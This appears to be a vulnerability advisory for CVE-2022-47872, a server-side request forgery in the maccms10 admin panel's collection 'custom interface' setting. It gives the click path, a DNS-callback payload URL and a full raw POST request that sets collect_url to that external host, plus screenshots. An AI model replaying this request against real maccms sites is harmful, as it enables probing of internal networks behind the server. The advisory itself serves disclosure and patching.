#CVE-2022-47872

maccms10  admin+  ssrf attacks

Overview

Manufacturer's website information：https://maccms.pro

Source code download address ： https://github.com/maccmspro/maccms10.git

Affected version: V2021.1000.2000

![图片](https://user-images.githubusercontent.com/42855430/215932537-d105bc58-87e2-4366-82f2-f1f0403814c8.png)

2.Vulnerability details

https://github.com/maccmspro/maccms10/issues/22

Enter the background, click Collect --> Custom interface --> Interface address,

In the name box into payload1:http://7ca8e96e.dns.1433.eu.org.

It can cause ssrf attacks.

Vulnerability name：ssrf attacks

Vulnerability level：Medium risk

Vulnerability location： click Collect --> Custom interface --> Interface address

3.Recurring vulnerabilities and 

POST http://192.168.52.163/admin.php/admin/collect/info.html HTTP/1.1

Host: 192.168.52.163

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101
Firefox/106.0 

Accept: */*

AcceptLanguage: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding:gzip,deflate

Content-Type: applicat ion/ x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 226

Origin: http://192.168.52.163

Connection: close

Referer: http://192.168.52.163/admin.php/admin/collect/info.html

Cookie: PHPSESSID=gn328q2i2ruajsh96qoll65ia7


collect_id=&_token_=8d639020c85bde89f9276381d2460046&collect_name=1111&collect_url=http%3A%2F%2F7ca8e96e.dns.1433.eu.org.&collect_param=%26q%3D1&collect_type=1&collect_mid=1&collect_opt=Ø&collect_filter=0&collect_filter_from=


![图片](https://user-images.githubusercontent.com/42855430/215932024-defff077-ec1b-45b9-81c7-bf9e37223a98.png)

![图片](https://user-images.githubusercontent.com/42855430/215932063-57a5f2f4-31bb-46bd-a6b6-fe4a8f2c96a8.png)

![图片](https://user-images.githubusercontent.com/42855430/215932077-eac1b29c-b30a-47f3-a8d6-0e53b1f544e6.png)

![图片](https://user-images.githubusercontent.com/42855430/215932121-e175516b-88fc-4793-875b-d17a043d125f.png)

![图片](https://user-images.githubusercontent.com/42855430/215932176-2316a662-911d-4ef7-9cad-785cda61b7d6.png)



